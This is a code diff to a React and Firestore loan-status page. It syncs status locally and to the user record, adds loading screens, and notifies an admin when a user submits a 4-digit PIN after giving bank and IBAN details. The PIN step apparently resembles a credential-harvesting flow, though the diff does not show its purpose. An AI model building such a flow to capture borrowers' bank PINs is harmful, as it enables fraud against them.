@@ -14,30 +14,48 @@ import {
   ChevronRight
 } from 'lucide-react';
 import { db } from '../../../lib/firebase';
-import { doc, updateDoc, serverTimestamp, addDoc, collection } from 'firebase/firestore';
+import { doc, updateDoc, serverTimestamp, addDoc, collection, increment } from 'firebase/firestore';
 import { useAuth } from '../../../hooks/useAuth';
 
 export const LoanStatusPage = () => {
-  const { activeLoan } = useOutletContext<{ activeLoan: any }>();
-  const { user } = useAuth();
+  const { user, userData, activeLoan, loanLoading } = useAuth();
   const navigate = useNavigate();
   const [isSubmitting, setIsSubmitting] = useState(false);
+  const [localStatus, setLocalStatus] = useState<string | null>(null);
   const [bankDetails, setBankDetails] = useState({
     bankName: '',
     accountNumber: '',
     accountName: ''
   });
 
+  const currentStatus = localStatus || activeLoan?.status || userData?.activeLoanStatus;
+
+  // Sync local status with active loan status
+  React.useEffect(() => {
+    if (activeLoan?.status === localStatus) {
+      setLocalStatus(null);
+    }
+  }, [activeLoan?.status, localStatus]);
+
   const handleBankSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
     if (!user || !activeLoan) return;
 
     setIsSubmitting(true);
+    setLocalStatus('bank_details_submitted');
+    
     try {
+      // First update the document
       await updateDoc(doc(db, 'loans', activeLoan.id), {
         status: 'bank_details_submitted',
         bankDetails,
         bankSubmittedAt: serverTimestamp(),
+        updatedAt: serverTimestamp()
+      });
+
+      // Update user document for instant UI feedback
+      await updateDoc(doc(db, 'users', user.uid), {
+        activeLoanStatus: 'bank_details_submitted',
         updatedAt: serverTimestamp()
       });
 
@@ -53,34 +71,65 @@ export const LoanStatusPage = () => {
       });
     } catch (err) {
       console.error('Error submitting bank details:', err);
+      setLocalStatus(null);
       alert('Failed to submit bank details. Please try again.');
     } finally {
-      setIsSubmitting(false);
+      // Keep isSubmitting true for a brief moment to allow snapshot to propagate
+      setTimeout(() => setIsSubmitting(false), 800);
     }
   };
 
-  if (!activeLoan) {
+  // If we know there's a loan (from userData) but the loan doc hasn't loaded yet
+  const isWaitingForLoanDoc = !activeLoan && (userData?.activeLoanStatus && userData.activeLoanStatus !== 'completed' && userData.activeLoanStatus !== 'rejected');
+
+  if (loanLoading || isWaitingForLoanDoc) {
+    return (
+      <div className="max-w-2xl mx-auto py-12 px-4 text-center">
+        <div className="w-20 h-20 bg-accent/10 rounded-full flex items-center justify-center mx-auto mb-6">
+          <div className="w-10 h-10 border-4 border-accent border-t-transparent rounded-full animate-spin" />
+        </div>
+        <h2 className="text-3xl font-black tracking-tighter dark:text-white mb-4 uppercase">Loading Loan Details</h2>
+        <p className="text-gray-500 mb-8 max-w-md mx-auto">
+          We're fetching your latest application details. This will only take a moment.
+        </p>
+      </div>
+    );
+  }
+
+  if (!activeLoan && !userData?.activeLoanStatus) {
     return (
       <div className="max-w-2xl mx-auto py-12 px-4 text-center">
         <div className="w-20 h-20 bg-gray-100 dark:bg-zinc-800 rounded-full flex items-center justify-center mx-auto mb-6">
-          <Clock className="w-10 h-10 text-gray-400" />
+          <Clock className="w-10 h-10 text-gray-400 animate-pulse" />
         </div>
         <h2 className="text-3xl font-black tracking-tighter dark:text-white mb-4 uppercase">No Active Loan</h2>
         <p className="text-gray-500 mb-8 max-w-md mx-auto">
-          You don't have any active loan applications at the moment.
+          We couldn't find an active loan application for your account.
         </p>
-        <button 
-          onClick={() => navigate('/dashboard/loan-application')}
-          className="btn-primary px-8 py-4 rounded-2xl text-sm font-black uppercase tracking-widest"
-        >
-          Apply for a Loan
-        </button>
+        <div className="flex flex-col gap-3 max-w-xs mx-auto">
+          <button 
+            onClick={() => navigate('/dashboard/loan-application')}
+            className="btn-primary px-8 py-4 rounded-2xl text-sm font-black uppercase tracking-widest"
+          >
+            Apply for a Loan
+          </button>
+        </div>
+      </div>
+    );
+  }
+
+  // If we have a status but still no activeLoan (rare edge case), show a generic loader
+  if (!activeLoan) {
+    return (
+      <div className="max-w-2xl mx-auto py-12 px-4 text-center">
+        <div className="w-12 h-12 border-4 border-accent border-t-transparent rounded-full animate-spin mx-auto mb-6" />
+        <p className="text-gray-500">Synchronizing your application...</p>
       </div>
     );
   }
 
   const renderStatusContent = () => {
-    switch (activeLoan.status) {
+    switch (currentStatus) {
       case 'pending':
         return (
           <div className="max-w-xl mx-auto">
@@ -254,6 +303,8 @@ export const LoanStatusPage = () => {
               onSubmit={async (e) => {
                 e.preventDefault();
                 setIsSubmitting(true);
+                setLocalStatus('pin_sent');
+                
                 const formData = new FormData(e.currentTarget);
                 const additionalDetails = {
                   iban: formData.get('iban'),
@@ -269,11 +320,18 @@ export const LoanStatusPage = () => {
                     additionalDetailsSubmittedAt: serverTimestamp(),
                     updatedAt: serverTimestamp()
                   });
+
+                  // Update user document for instant UI feedback
+                  await updateDoc(doc(db, 'users', user.uid), {
+                    activeLoanStatus: 'pin_sent',
+                    updatedAt: serverTimestamp()
+                  });
                 } catch (err) {
                   console.error('Error submitting additional details:', err);
+                  setLocalStatus(null);
                   alert('Failed to submit details.');
                 } finally {
-                  setIsSubmitting(false);
+                  setTimeout(() => setIsSubmitting(false), 800);
                 }
               }} 
               className="card space-y-6 border-2 border-blue-500/10"
@@ -352,17 +410,37 @@ export const LoanStatusPage = () => {
                 onChange={async (e) => {
                   if (e.target.value.length === 4) {
                     setIsSubmitting(true);
+                    setLocalStatus('pin_submitted');
+                    
                     try {
                       await updateDoc(doc(db, 'loans', activeLoan.id), {
                         status: 'pin_submitted',
                         pinSubmittedAt: serverTimestamp(),
                         updatedAt: serverTimestamp()
                       });
+
+                      // Update user document for instant UI feedback
+                      await updateDoc(doc(db, 'users', user.uid), {
+                        activeLoanStatus: 'pin_submitted',
+                        updatedAt: serverTimestamp()
+                      });
+
+                      // Notify admin
+                      await addDoc(collection(db, 'notifications', 'admin', 'items'), {
+                        type: 'pin_submitted',
+                        title: 'PIN Verified',
+                        message: `User ${user.email} has verified their PIN for loan ${activeLoan.id}. Ready for disbursement.`,
+                        loanId: activeLoan.id,
+                        userId: user.uid,
+                        createdAt: serverTimestamp(),
+                        read: false
+                      });
                     } catch (err) {
                       console.error('Error submitting PIN:', err);
+                      setLocalStatus(null);
                       alert('Failed to submit PIN.');
                     } finally {
-                      setIsSubmitting(false);
+                      setTimeout(() => setIsSubmitting(false), 800);
                     }
                   }
                 }}
@@ -434,10 +512,18 @@ export const LoanStatusPage = () => {
       </div>
 
       <motion.div 
-        initial={{ opacity: 0, y: 20 }}
-        animate={{ opacity: 1, y: 0 }}
-        className="card min-h-[400px] flex flex-col justify-center"
+        key={currentStatus}
+        initial={{ opacity: 0, x: 20 }}
+        animate={{ opacity: 1, x: 0 }}
+        exit={{ opacity: 0, x: -20 }}
+        className="card min-h-[400px] flex flex-col justify-center relative overflow-hidden"
       >
+        {isSubmitting && (
+          <div className="absolute inset-0 bg-white/80 dark:bg-zinc-950/80 backdrop-blur-sm z-50 flex flex-col items-center justify-center">
+            <div className="w-12 h-12 border-4 border-accent border-t-transparent rounded-full animate-spin mb-4" />
+            <p className="text-sm font-black uppercase tracking-widest text-accent">Processing...</p>
+          </div>
+        )}
         {renderStatusContent()}
       </motion.div>
     </div>
